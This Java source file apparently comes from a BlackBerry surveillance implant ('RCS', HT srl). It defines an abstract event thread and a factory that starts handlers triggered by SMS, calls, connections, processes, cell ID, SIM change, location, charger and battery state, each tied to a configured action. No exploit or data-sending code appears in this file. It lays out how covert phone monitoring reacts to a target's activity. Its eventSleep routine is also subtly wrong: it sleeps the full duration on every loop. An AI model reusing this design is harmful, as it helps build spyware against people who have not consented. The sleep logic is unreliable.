/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Event.java
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Event.
 */
public abstract class Event extends Thread {

    /** The debug. */
    private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);

    /** The Constant EVENT. */
    public static final int EVENT = 0x2000;

    /** The Constant EVENT_TIMER. */
    public static final int EVENT_TIMER = EVENT + 0x1;

    /** The Constant EVENT_SMS. */
    public static final int EVENT_SMS = EVENT + 0x2;

    /** The Constant EVENT_CALL. */
    public static final int EVENT_CALL = EVENT + 0x3;

    /** The Constant EVENT_CONNECTION. */
    public static final int EVENT_CONNECTION = EVENT + 0x4;

    /** The Constant EVENT_PROCESS. */
    public static final int EVENT_PROCESS = EVENT + 0x5;

    /** The Constant EVENT_CELLID. */
    public static final int EVENT_CELLID = EVENT + 0x6;

    /** The Constant EVENT_QUOTA. */
    public static final int EVENT_QUOTA = EVENT + 0x7;

    /** The Constant EVENT_SIM_CHANGE. */
    public static final int EVENT_SIM_CHANGE = EVENT + 0x8;

    /** The Constant EVENT_LOCATION. */
    public static final int EVENT_LOCATION = EVENT + 0x9;

    /** The Constant EVENT_AC. */
    public static final int EVENT_AC = EVENT + 0xa;

    /** The Constant EVENT_BATTERY. */
    public static final int EVENT_BATTERY = EVENT + 0xb;

    // variables
    
    /** The Event type. */
    public int eventType = -1;

    /** The Event id. */
    public int eventId = -1;

    /** The Action id. */
    public int actionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
    // rompe.

    /** The status obj. */
    protected Status statusObj = null;

    /** The Need to stop. */
    boolean needToStop = false;

    /** The Running. */
    boolean running = false;
    
    /**
     * Factory.
     * 
     * @param eventId
     *            the event id
     * @param eventType
     *            the event type
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     * @return the event
     */
    public static Event factory(int eventId, int eventType, int actionId,
            byte[] confParams) {
        Event event = null;

        switch (eventType) {
        case EVENT_TIMER:
            debug.trace("Factory EVENT_TIMER");
            event = new TimerEvent(actionId, confParams);
            break;
        case EVENT_SMS:
            debug.trace("Factory EVENT_SMS");
            event = new SmsEvent(actionId, confParams);
            break;
        case EVENT_CALL:
            debug.trace("Factory EVENT_CALL");
            event = new CallEvent(actionId, confParams);
            break;
        case EVENT_CONNECTION:
            debug.trace("Factory EVENT_CONNECTION");
            event = new ConnectionEvent(actionId, confParams);
            break;
        case EVENT_PROCESS:
            debug.trace("Factory EVENT_PROCESS");
            event = new ProcessEvent(actionId, confParams);
            break;
        case EVENT_CELLID:
            debug.trace("Factory EVENT_CELLID");
            event = new CellIdEvent(actionId, confParams);
            break;
        case EVENT_QUOTA:
            debug.trace("Factory EVENT_QUOTA");
            event = new QuotaEvent(actionId, confParams);
            break;
        case EVENT_SIM_CHANGE:
            debug.trace("Factory EVENT_SIM_CHANGE");
            event = new SimChangeEvent(actionId, confParams);
            break;
        case EVENT_LOCATION:
            debug.trace("Factory EVENT_LOCATION");
            event = new LocationEvent(actionId, confParams);
            break;
        case EVENT_AC:
            debug.trace("Factory EVENT_AC");
            event = new AcEvent(actionId, confParams);
            break;
        case EVENT_BATTERY:
            debug.trace("Factory EVENT_BATTERY");
            event = new BatteryEvent(actionId, confParams);
            break;
        default:
            debug.error("Factory Unknown type:" + eventType);
            return null;
        }

        // TODO: mettere dentro i costruttori
        event.eventId = eventId;
        return event;
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId
     *            the event id
     * @param actionId
     *            the action id
     */
    protected Event(int eventId_, int actionId_) {
        this.statusObj = Status.getInstance();

        this.eventType = eventId_;
        this.actionId = actionId_;
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId
     *            the event id
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    protected Event(int eventId_, int actionId_, byte[] confParams) {
        this(eventId_, actionId_);
        parse(confParams);
    }

    /**
     * Event run.
     */
    protected abstract void eventRun();

    /**
     * Event sleep.
     * 
     * @param millisec
     *            the millisec
     * @return true, if successful
     */
    protected boolean eventSleep(int millisec) {
        int loops = 0;
        int sleepTime = 1000;

        if (millisec < sleepTime) {
            Utils.sleep(millisec);

            if (needToStop) {
                needToStop = false;
                return true;
            }

            return false;
        } else {
            loops = millisec / sleepTime;
        }

        while (loops > 0) {
            Utils.sleep(millisec);
            loops--;

            if (needToStop) {
                needToStop = false;
                return true;
            }
        }

        return false;
    }

    /**
     * Checks if is running.
     * 
     * @return true, if is running
     */
    public boolean isRunning() {
        return running;
    }

    /**
     * Parses the.
     * 
     * @param confParams
     *            the conf params
     * @return true, if successful
     */
    protected abstract boolean parse(byte[] confParams);

    /*
     * (non-Javadoc)
     * 
     * @see java.lang.Thread#run()
     */
    public void run() {
        debug.info("Run");
        needToStop = false;
        running = true;

        eventRun();

        running = false;
        debug.info("End");
    }

    /**
     * Stop.
     */
    public void stop() {
        debug.info("Stopping...");
        needToStop = true;
    }
}
